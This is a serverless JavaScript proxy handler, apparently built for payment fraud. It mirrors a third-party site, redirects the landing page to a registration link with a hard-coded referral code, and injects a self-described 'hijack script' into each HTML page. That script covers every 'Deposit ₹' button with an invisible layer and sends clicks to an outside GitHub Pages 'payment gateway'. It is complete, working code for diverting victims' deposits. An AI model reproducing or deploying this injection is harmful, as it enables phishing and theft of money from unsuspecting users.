export default async function handler(req, res) {
  const myInviteCode = "6683618531272"; // [cite: 2025-12-24]
  const myGitHub = "https://hacrrk1-netizen.github.io/FAST-payment-gateway-/";
  const targetHost = "https://www.91appq.com";

  if (req.url === "/" || req.url === "") {
    res.writeHead(302, { Location: `${targetHost}/#/register?invitationCode=${myInviteCode}` });
    res.end();
    return;
  }

  const response = await fetch(targetHost + req.url, {
    headers: { 'User-Agent': req.headers['user-agent'] }
  });

  const contentType = response.headers.get("content-type");

  if (contentType && contentType.includes("text/html")) {
    let html = await response.text();

    // STRICT HIJACK SCRIPT (Only for Deposit + ₹)
    const hijackScript = `
    <script>
      (function() {
        const strictLock = () => {
          const allElements = document.querySelectorAll('div, button, span, .van-button');
          
          allElements.forEach(el => {
            const text = el.innerText || "";
            // Yahan hum sirf tab lock karenge jab "Deposit" aur "₹" dono ek saath hon
            if (text.includes('Deposit') && text.includes('₹')) {
              
              if (!el.dataset.hijacked) {
                el.style.position = 'relative';

                const layer = document.createElement('div');
                layer.style = 'position:absolute;top:0;left:0;width:100%;height:100%;z-index:999999;cursor:pointer;background:rgba(0,0,0,0);';

                layer.onclick = (e) => {
                  e.preventDefault();
                  e.stopPropagation();
                  window.location.href = "${myGitHub}";
                };

                el.appendChild(layer);
                el.dataset.hijacked = "true";
              }
            }
          });
        };
        // Har 300ms mein scan karega taaki naya amount aane pe bhi lock rahe
        setInterval(strictLock, 300);
      })();
    </script>`;

    res.setHeader('Content-Type', 'text/html');
    return res.send(html.replace('</body>', hijackScript + '</body>'));
  }

  const data = await response.arrayBuffer();
  res.setHeader('Content-Type', contentType);
  res.send(Buffer.from(data));
}
